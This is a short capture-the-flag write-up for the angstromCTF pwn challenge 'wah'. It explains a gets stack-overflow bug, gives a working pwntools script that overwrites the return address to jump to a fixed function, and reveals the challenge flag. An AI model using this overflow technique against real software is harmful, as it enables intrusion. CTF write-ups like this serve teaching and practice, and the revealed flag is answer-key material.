#### Challenge:

Baby friendly!

[wah](./wah ":ignore") [wah.c](./wah.c ":ignore")

`nc challs.actf.co 31224`

---

#### Solution:

Classic `gets` stack overflow with return address overwrite, basically same as `tranquil` from `angstromctf 2021`.

```python
#!/usr/bin/env python

from pwn import *
from struct import *

r = remote('challs.actf.co', 31224)
# r = process('./wah')

payload = b'A'*(32) + b'B'*8 + pack("<Q", 0x0000000000401236)

print(r.recvuntil("Cry:").decode('utf-8').strip())

r.sendline(payload)

print(r.recvline().decode('utf-8').strip())
r.close()
```

---

<details><summary>FLAG:</summary>

```
actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}
```

</details>
<br/>
